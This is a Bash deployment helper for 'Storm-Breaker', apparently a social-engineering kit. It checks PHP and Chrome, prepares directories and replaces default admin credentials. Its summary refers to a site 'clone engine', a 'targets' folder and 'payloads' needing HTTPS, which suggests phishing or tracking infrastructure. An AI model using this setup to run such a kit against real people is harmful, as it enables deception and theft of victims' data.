#!/usr/bin/env bash
# Storm-Breaker — server deployment helper.
# Run from the project root after cloning/uploading the repo to your server.

set -e

RED='\033[0;31m'
BLU='\033[0;34m'
GRN='\033[0;32m'
YEL='\033[0;33m'
RST='\033[0m'

info()  { printf "${BLU}[*]${RST} %s\n" "$1"; }
ok()    { printf "${GRN}[+]${RST} %s\n" "$1"; }
warn()  { printf "${YEL}[!]${RST} %s\n" "$1"; }
err()   { printf "${RED}[x]${RST} %s\n" "$1" >&2; }

ROOT="$(cd "$(dirname "$0")" && pwd)"
WEB="${ROOT}/storm-web"

if [ ! -d "$WEB" ]; then
    err "storm-web/ not found at ${WEB}"
    exit 1
fi

# ── PHP version ──────────────────────────────────────────────

detect_os() {
    case "$(uname -s)" in
        Darwin) OS="macos" ;;
        Linux)
            if [ -f /etc/os-release ]; then
                . /etc/os-release
                case "$ID" in
                    ubuntu|debian|pop|linuxmint|elementary|kali) OS="debian" ;;
                    fedora|rhel|centos|rocky|alma|ol) OS="rhel" ;;
                    arch|manjaro|endeavouros) OS="arch" ;;
                    opensuse*|sles) OS="suse" ;;
                    alpine) OS="alpine" ;;
                    *) OS="linux" ;;
                esac
            else
                OS="linux"
            fi
            ;;
        *) OS="unknown" ;;
    esac
}
detect_os

php_install_hint() {
    case "$OS" in
        macos)  echo "  brew install php" ;;
        debian) echo "  sudo apt install php php-cli php-sqlite3 php-curl php-json" ;;
        rhel)   echo "  sudo dnf install php php-cli php-pdo php-sqlite3 php-curl php-json" ;;
        arch)   echo "  sudo pacman -S php" ;;
        suse)   echo "  sudo zypper install php8 php8-sqlite php8-curl" ;;
        alpine) echo "  sudo apk add php82 php82-sqlite3 php82-curl php82-session php82-json" ;;
        *)      echo "  Install PHP 7.4+ with sqlite3, curl, json, and session extensions." ;;
    esac
}

ext_install_hint() {
    local exts="$1"
    case "$OS" in
        macos)  echo "  Extensions are bundled with Homebrew PHP. Try: brew reinstall php" ;;
        debian) echo "  sudo apt install $(echo "$exts" | sed 's/[^ ]*/php-&/g')" ;;
        rhel)   echo "  sudo dnf install $(echo "$exts" | sed 's/[^ ]*/php-&/g')" ;;
        arch)   echo "  Enable them in /etc/php/php.ini (built-in with php package)" ;;
        suse)   echo "  sudo zypper install $(echo "$exts" | sed 's/[^ ]*/php8-&/g')" ;;
        alpine) echo "  sudo apk add $(echo "$exts" | sed 's/[^ ]*/php82-&/g')" ;;
        *)      echo "  Install the missing PHP extensions: $exts" ;;
    esac
}

info "Checking PHP availability"
if ! command -v php >/dev/null 2>&1; then
    err "PHP is not installed."
    info "Install it with:"
    php_install_hint
    exit 1
fi

PHP_VERSION="$(php -r 'echo PHP_VERSION;')"
PHP_MAJOR="$(php -r 'echo PHP_MAJOR_VERSION;')"
PHP_MINOR="$(php -r 'echo PHP_MINOR_VERSION;')"

if [ "$PHP_MAJOR" -lt 7 ] || { [ "$PHP_MAJOR" -eq 7 ] && [ "$PHP_MINOR" -lt 4 ]; }; then
    err "PHP ${PHP_VERSION} is too old. PHP 7.4+ is required."
    exit 1
fi
ok "PHP ${PHP_VERSION} detected"

# ── Required PHP extensions ──────────────────────────────────

info "Checking required PHP extensions"
REQUIRED_EXT=(json session sqlite3 curl)
MISSING=()
for ext in "${REQUIRED_EXT[@]}"; do
    if ! php -m | grep -qi "^${ext}$"; then
        MISSING+=("$ext")
    fi
done

if [ ${#MISSING[@]} -gt 0 ]; then
    err "Missing PHP extensions: ${MISSING[*]}"
    info "Install them with:"
    ext_install_hint "${MISSING[*]}"
    exit 1
fi
ok "Required extensions present (json, session, sqlite3, curl)"

# ── Optional: headless Chrome ────────────────────────────────

info "Checking for headless Chrome (optional)"
CHROME_FOUND=false
if command -v google-chrome >/dev/null 2>&1 || command -v chromium-browser >/dev/null 2>&1 || command -v chromium >/dev/null 2>&1; then
    CHROME_FOUND=true
elif [ "$OS" = "macos" ] && [ -d "/Applications/Google Chrome.app" ]; then
    CHROME_FOUND=true
fi

if $CHROME_FOUND; then
    ok "Headless Chrome found — clones will use full DOM rendering"
else
    warn "Headless Chrome not found — clone engine will fall back to cURL (SPAs won't render fully)"
fi

# ── Writable directories ─────────────────────────────────────

info "Preparing writable directories"
WRITABLE=(
    "$WEB/data"
    "$WEB/targets"
    "$WEB/log"
)
for d in "${WRITABLE[@]}"; do
    mkdir -p "$d"
    chmod 0755 "$d"
done

if [ "$OS" != "macos" ] && command -v id >/dev/null 2>&1; then
    WEB_USER=""
    for u in www-data nginx apache http; do
        if id "$u" >/dev/null 2>&1; then
            WEB_USER="$u"
            break
        fi
    done
    if [ -n "$WEB_USER" ]; then
        chown -R "$WEB_USER:$WEB_USER" "$WEB/data" "$WEB/targets" "$WEB/log" 2>/dev/null && \
            ok "Ownership set to ${WEB_USER}" || \
            warn "Could not set ownership to ${WEB_USER} — run deploy.sh with sudo if needed"
    fi
fi

# .gitkeep for targets
touch "$WEB/targets/.gitkeep"

# Protect data/ from web access (belt + suspenders with router.php)
if [ ! -f "$WEB/data/.htaccess" ]; then
    printf 'Deny from all\n' > "$WEB/data/.htaccess"
fi
ok "Directories ready (data/, targets/, log/)"

# ── Admin credentials ────────────────────────────────────────

info "Setting up admin credentials"

CONFIG_FILE="${WEB}/config.php"
DEFAULT_HASH='$2y$10$rWRM/86rX63rwTadZAu1AeGyhH6ddlkKjaHMRRTiu8S78XDjg6aq2'

# Check if config still has the default admin/admin hash
if grep -q "$DEFAULT_HASH" "$CONFIG_FILE" 2>/dev/null; then
    warn "Default credentials detected (admin/admin). Let's set a new username and password."
    echo ""

    # Read username
    read -rp "  Enter admin username [admin]: " NEW_USER
    NEW_USER="${NEW_USER:-admin}"

    # Read password (hidden)
    while true; do
        read -rsp "  Enter password (min 8 chars): " NEW_PASS
        echo ""
        if [ ${#NEW_PASS} -lt 8 ]; then
            err "  Password must be at least 8 characters."
            continue
        fi
        read -rsp "  Confirm password: " CONFIRM_PASS
        echo ""
        if [ "$NEW_PASS" != "$CONFIRM_PASS" ]; then
            err "  Passwords do not match. Try again."
            continue
        fi
        break
    done

    # Generate bcrypt hash via PHP
    NEW_HASH=$(php -r "echo password_hash(\$argv[1], PASSWORD_BCRYPT);" "$NEW_PASS")

    # Write new config.php
    cat > "$CONFIG_FILE" <<PHPEOF
<?php
// config.php — credentials store. Managed by auth.php.
// 'hash' is a bcrypt hash; never store plaintext.
\$CONFIG = [
    '${NEW_USER}' => [
        'hash' => '${NEW_HASH}',
    ],
];
PHPEOF

    ok "Credentials saved for user '${NEW_USER}'"
else
    ok "Custom credentials already set — skipping"
fi

# ── Summary ──────────────────────────────────────────────────

cat <<EOF

${GRN}Deployment preparation complete.${RST}

Next steps:
  1. Point your web server's document root at:
       ${WEB}
     Or use the built-in PHP server for testing:
       php run-local.php
  2. Make sure HTTPS is enabled — several payloads require a secure context.
  3. Visit the panel and log in with your credentials.

EOF
